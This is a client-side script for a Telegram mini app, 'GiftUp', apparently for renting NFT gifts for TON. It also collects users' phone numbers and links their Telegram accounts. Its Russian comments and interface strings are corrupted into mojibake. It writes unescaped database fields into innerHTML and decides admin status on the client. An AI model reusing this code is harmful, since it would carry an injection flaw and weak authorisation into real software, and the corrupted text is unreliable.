<script>
    let userData = {};
    let currentGifts = [];

    async function initApp() {
        const tg = window.Telegram.WebApp;
        
        // –ú–∏–Ω–∏–º–∞–ª–∏—Å—Ç–∏—á–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ Telegram Web App
        tg.expand();
        tg.enableClosingConfirmation();
        tg.setHeaderColor('#1E293B');
        tg.setBackgroundColor('#0F172A');
        
        if (tg.initDataUnsafe.user) {
            userData = {
                id: tg.initDataUnsafe.user.id.toString(),
                firstName: tg.initDataUnsafe.user.first_name,
                lastName: tg.initDataUnsafe.user.last_name,
                username: tg.initDataUnsafe.user.username,
                photoUrl: tg.initDataUnsafe.user.photo_url
            };
            
            updateUserInterface();
            await loadGifts();
            await checkAuthStatus();
        }
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
        setTimeout(() => {
            tg.showPopup({
                title: "üéâ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!",
                message: "–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ GiftUp - –ø–ª–∞—Ç—Ñ–æ—Ä–º—É –ø—Ä–µ–º–∏—É–º –∞—Ä–µ–Ω–¥—ã NFT!",
                buttons: [{ type: 'default', text: '–ù–∞—á–∞—Ç—å' }]
            });
        }, 1000);
    }

    function updateUserInterface() {
        document.getElementById('userName').textContent = 
            userData.firstName || '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å';
        document.getElementById('userId').textContent = userData.id;
        
        if (userData.photoUrl) {
            document.getElementById('avatarImage').src = userData.photoUrl;
            document.getElementById('avatarImage').style.display = 'block';
            document.getElementById('avatarPlaceholder').style.display = 'none';
        }
        
        if (userData.id === CONFIG.ADMIN_ID) {
            document.getElementById('adminBadge').style.display = 'block';
        }
    }

    async function loadGifts() {
        try {
            currentGifts = await window.supabaseClient.getGifts();
            renderGifts(currentGifts);
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –ø–æ–¥–∞—Ä–∫–æ–≤:', error);
            showEmptyState();
        }
    }

    function renderGifts(gifts) {
        const container = document.getElementById('giftsList');
        
        if (gifts.length === 0) {
            showEmptyState();
            return;
        }
        
        container.innerHTML = gifts.map(gift => `
            <div class="gift-card premium-glow" onclick="showRentModal(${gift.id})">
                <div class="gift-image" style="background-image: url('${gift.image}')">
                    <div class="gift-badge">PREMIUM</div>
                </div>
                <div class="gift-name">${gift.model}</div>
                <div class="gift-price">${gift.price} TON</div>
                <div class="gift-period">
                    <span>üìÖ</span>
                    ${gift.days} –¥–Ω–µ–π
                </div>
            </div>
        `).join('');
    }

    function showEmptyState() {
        const container = document.getElementById('giftsList');
        container.innerHTML = `
            <div style="grid-column: 1 / -1; text-align: center; padding: 50px 16px;">
                <div style="font-size: 48px; margin-bottom: 12px;">üéÅ</div>
                <div style="font-size: 18px; font-weight: 600; margin-bottom: 6px; color: var(--text);">–ü–æ–¥–∞—Ä–∫–æ–≤ –ø–æ–∫–∞ –Ω–µ—Ç</div>
                <div style="color: var(--text-secondary); font-size: 13px;">–ê–¥–º–∏–Ω –¥–æ–±–∞–≤–∏—Ç –ø–æ–¥–∞—Ä–∫–∏ —Å–∫–æ—Ä–æ!</div>
            </div>
        `;
    }

    async function showRentModal(giftId) {
        const gift = currentGifts.find(g => g.id === giftId);
        if (!gift) return;

        const tg = window.Telegram.WebApp;
        
        tg.showPopup({
            title: `üéÅ ${gift.model}`,
            message: `–•–æ—Ç–∏—Ç–µ –∞—Ä–µ–Ω–¥–æ–≤–∞—Ç—å —ç—Ç–æ—Ç –ø—Ä–µ–º–∏—É–º –ø–æ–¥–∞—Ä–æ–∫?\n\nüíé –ú–æ–¥–µ–ª—å: ${gift.model}\nüí∞ –¶–µ–Ω–∞: ${gift.price} TON\nüìÖ –°—Ä–æ–∫: ${gift.days} –¥–Ω–µ–π`,
            buttons: [
                {
                    id: 'rent',
                    type: 'default',
                    text: `‚úÖ –ê—Ä–µ–Ω–¥–æ–≤–∞—Ç—å –∑–∞ ${gift.price} TON`
                },
                {
                    type: 'cancel',
                    text: '‚ùå –û—Ç–º–µ–Ω–∞'
                }
            ]
        }, async (buttonId) => {
            if (buttonId === 'rent') {
                await rentGift(giftId);
            }
        });
    }

    async function rentGift(giftId) {
        try {
            const result = await window.supabaseClient.rentGift(giftId, userData.id);
            
            if (result.success) {
                window.Telegram.WebApp.showAlert('üéâ –ü–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –∞—Ä–µ–Ω–¥–æ–≤–∞–Ω!');
                await updateUserStats();
            } else {
                window.Telegram.WebApp.showAlert('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∞—Ä–µ–Ω–¥–µ –ø–æ–¥–∞—Ä–∫–∞');
            }
        } catch (error) {
            window.Telegram.WebApp.showAlert('‚ùå –û—à–∏–±–∫–∞: ' + error.message);
        }
    }

    function switchTab(tabName) {
        document.querySelectorAll('.tab-content').forEach(tab => {
            tab.classList.remove('active');
        });
        
        document.getElementById(tabName).classList.add('active');
        
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
        });
        event.currentTarget.classList.add('active');
    }

    function showModal(modalId) {
        document.getElementById(modalId).style.display = 'flex';
    }

    function closeModal(modalId) {
        document.getElementById(modalId).style.display = 'none';
    }

    function showPhoneModal() {
        showModal('phoneModal');
    }

    // –ò–°–ü–†–ê–í–õ–ï–ù–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø –°–û–•–†–ê–ù–ï–ù–ò–Ø –ù–û–ú–ï–†–ê
    async function savePhoneNumber() {
        const phoneInput = document.getElementById('phoneInput');
        let phone = phoneInput.value.replace(/\D/g, '');
        
        // –î–æ–±–∞–≤–ª—è–µ–º +7 –µ—Å–ª–∏ –Ω–æ–º–µ—Ä –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å 7 –∏–ª–∏ 8
        if (phone.startsWith('7') && phone.length === 11) {
            phone = '+7' + phone.substring(1);
        } else if (phone.startsWith('8') && phone.length === 11) {
            phone = '+7' + phone.substring(1);
        } else if (phone.length === 10) {
            phone = '+7' + phone;
        }
        
        if (phone.length < 12) {
            window.Telegram.WebApp.showAlert('‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
            return;
        }
        
        try {
            const result = await window.supabaseClient.savePhoneNumber(userData.id, phone);
            
            if (result.success) {
                await updatePhoneDisplay(phone);
                closeModal('phoneModal');
                window.Telegram.WebApp.showAlert('‚úÖ –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω!');
            } else {
                window.Telegram.WebApp.showAlert('‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω–æ–º–µ—Ä–∞: ' + result.error);
            }
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è:', error);
            window.Telegram.WebApp.showAlert('‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω–æ–º–µ—Ä–∞');
        }
    }

    async function updatePhoneDisplay(phone) {
        const flag = getCountryFlag(phone);
        const formatted = formatPhoneForDisplay(phone);
        
        document.getElementById('phoneFlag').textContent = flag;
        document.getElementById('phoneNumber').textContent = formatted;
    }

    // –ò–°–ü–†–ê–í–õ–ï–ù–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø –ü–†–ò–í–Ø–ó–ö–ò TELEGRAM
    async function bindTelegram() {
        const tg = window.Telegram.WebApp;
        
        // –°–æ–∑–¥–∞–µ–º —Å—Å—ã–ª–∫—É –¥–ª—è –ø—Ä–∏–≤—è–∑–∫–∏ —Å user_id
        const bindLink = `https://t.me/${CONFIG.BOT_USERNAME}?start=bind_${userData.id}`;
        
        console.log('Redirect to:', bindLink);
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ
        tg.showPopup({
            title: "üîó –ü—Ä–∏–≤—è–∑–∫–∞ Telegram",
            message: "–°–µ–π—á–∞—Å –æ—Ç–∫—Ä–æ–µ—Ç—Å—è –±–æ—Ç –¥–ª—è –ø—Ä–∏–≤—è–∑–∫–∏ –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞. –ù–∞–∂–º–∏—Ç–µ 'START' –≤ –±–æ—Ç–µ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–∏–≤—è–∑–∫–∏.",
            buttons: [
                {id: 'open_bot', type: 'default', text: 'üì± –û—Ç–∫—Ä—ã—Ç—å –±–æ—Ç–∞'},
                {type: 'cancel', text: '‚ùå –û—Ç–º–µ–Ω–∞'}
            ]
        }, (buttonId) => {
            if (buttonId === 'open_bot') {
                // –û—Ç–∫—Ä—ã–≤–∞–µ–º –±–æ—Ç–∞
                tg.openTelegramLink(bindLink);
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é
                setTimeout(() => {
                    tg.showAlert("üì± –ë–æ—Ç –æ—Ç–∫—Ä—ã—Ç! –ù–∞–∂–º–∏—Ç–µ 'START' –¥–ª—è –ø—Ä–∏–≤—è–∑–∫–∏ –∞–∫–∫–∞—É–Ω—Ç–∞.");
                }, 1000);
            }
        });
    }

    async function updateUserStats() {
        try {
            const stats = await window.supabaseClient.getUserStats(userData.id);
            document.getElementById('rentedGifts').textContent = stats.rentedGifts;
            document.getElementById('myGifts').textContent = stats.myGifts || 0;
            document.getElementById('balance').textContent = stats.balance + ' TON';
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏:', error);
        }
    }

    async function checkAuthStatus() {
        try {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∏–≤—è–∑–∫—É Telegram
            const bindStatus = await window.supabaseClient.getTelegramBindStatus(userData.id);
            if (bindStatus) {
                document.getElementById('telegramStatus').textContent = '‚úÖ –ü—Ä–∏–≤—è–∑–∞–Ω';
                document.getElementById('telegramStatus').className = 'status-connected';
                document.getElementById('bindTelegramBtn').textContent = '‚úÖ Telegram –ø—Ä–∏–≤—è–∑–∞–Ω';
                document.getElementById('bindTelegramBtn').disabled = true;
            }
            
            await updateUserStats();
            
            // –ó–∞–≥—Ä—É–∂–∞–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –µ—Å–ª–∏ –µ—Å—Ç—å
            const userDataFromDb = await window.supabaseClient.getUserData(userData.id);
            if (userDataFromDb && userDataFromDb.phone) {
                await updatePhoneDisplay(userDataFromDb.phone);
            }
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Ç–∞—Ç—É—Å–∞:', error);
        }
    }

    document.addEventListener('DOMContentLoaded', initApp);
</script>
